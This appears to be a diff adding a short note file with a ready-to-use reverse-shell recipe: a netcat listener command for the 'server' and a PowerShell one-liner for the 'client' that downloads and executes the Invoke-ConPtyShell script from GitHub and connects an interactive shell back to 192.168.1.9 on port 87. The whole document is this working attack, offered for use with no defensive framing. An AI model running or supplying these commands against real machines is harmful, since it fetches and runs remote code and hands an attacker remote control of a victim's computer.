@@ -1,0 +1,8 @@
+Server:-
+stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 192.168.1.9 
+
+Client:-
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.9 87
+
+
+NOTE:- BOTH CLIENT AND SERVER HAVE TO BE ON THE SAME WIFI NETWORK
